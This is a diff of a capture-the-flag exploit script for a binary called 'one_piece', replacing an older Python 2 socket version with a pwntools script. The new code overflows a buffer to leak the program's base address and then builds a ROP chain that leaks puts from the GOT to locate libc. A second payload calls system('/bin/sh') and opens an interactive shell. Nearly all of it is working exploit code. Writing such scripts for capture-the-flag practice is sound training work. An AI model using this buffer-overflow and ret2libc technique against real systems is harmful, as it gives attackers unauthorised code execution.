@@ -1,67 +1,73 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
+from pwn import *
+import time
 
-import sys
-import struct
-import socket
-import re
+elf = context.binary = ELF('./one_piece')
+context.log_level = 'INFO'
+context.terminal = 'alacritty'
 
-local = False
+libpath = '~/Downloads/libc-2.32-1-x86_64'
+libc = ELF(libpath + 'libc-2.30.so')
+p = process(elf.path)
+#p = remote('onepiece.fword.wtf', 1238)
 
-challange_ip = 'onepiece.fword.wtf'
-challange_port = 1238
+p.recvuntil('>>')
+p.sendline('read')
+p.recvuntil('>>')
+p.send('A' * 0x27 + 'z')
+p.recvuntil('>>')
+p.sendline('gomugomunomi')
+p.recvuntil('amazing, right ? : ')
 
-def search_for_address(data):
-    try:
-        return re.search(r'.*Luffy is amazing.*\s([a-f0-9]+)($|\s*)', data).groups()[0]
-    except:
-        return None
+whatisthis = p.recvline().strip()
+mugiwara = (int(whatisthis,16) & (2**64 - 0x1000)) + elf.sym.mugiwara
 
-class PWNCon:
-    def __init__(self, local = False):
-        self.local = local
-        if not self.local:
-            self.op = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.op.connect((challange_ip, challange_port))
+log.info('mugiwara: ' + hex(mugiwara))
+elf.address = mugiwara - elf.sym.mugiwara
+log.info('elf.address: ' + hex(elf.address))
 
-            self.op_read = self.op.makefile()
+# Wanna tell Luffy something?
+p.recvline()
+rop = ROP([elf])
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 
-    def write(self, data):
-        if not self.local:
-            self.op.sendall(data)
-        else:
-            sys.stdout.write(data)
+payload = 0x38 * b'A'
+payload += p64(pop_rdi)
+payload += p64(elf.got.puts)
+payload += p64(elf.plt.puts)
+#payload += p64(pop_rdi)
+#payload += p64(elf.got.printf)
+#payload += p64(elf.plt.puts)
+#payload += p64(pop_rdi)
+#payload += p64(elf.got.read)
+#payload += p64(elf.plt.puts)
+payload += p64(elf.sym.choice)
 
-    def readline(self):
-        if not self.local:
-            return self.op_read.readline()
-        else:
-            return 'MOCK READ'
+p.sendline(payload)
 
-sys_exit = 0x0000555555554780
+puts = u64(p.recvline().strip() + b'\x00\x00')
+libc.address = puts - libc.sym.puts
 
-io_buffer_overrun = 'A' * 0x27 + 'z'
-ret = struct.pack('<Q', sys_exit)
-io_local_buffer_overrun = ('A' * 0x30) + ret + ret + '\n'
+log.info(f'{puts=:x} ')
+log.info(f'{libc.address=:x} ')
 
-op = PWNCon(local)
+system_offset = 0x4a82f
+libc_system = libc.address + system_offset
+str_bin_sh = libc.address + 0x18de78
 
-print(op.readline())
-op.write('read\n')
-op.write(io_buffer_overrun)
-op.write('gomugomunomi\n')
+log.info(f'{libc_system=:x} ')
 
-address = None
-while not address:
-    address = search_for_address(op.readline())
+p.recvuntil('>>')
+p.sendline('gomugomunomi')
+p.recvuntil('amazing, right ? : ')
 
-sys.stderr.write('Got address: {}'.format(address))
-address = int(address) & 0xfffffff000 # binary base address
+payload = 0x38 * b'A'
+payload += p64(pop_rdi)
+payload += p64(str_bin_sh)
+payload += p64(libc_system)
 
-op.write(io_local_buffer_overrun)
+p.sendline(payload)
 
-if op.local:
-    exit(0)
+p.interactive()
 
-while 1:
-    print(op.readline())
 
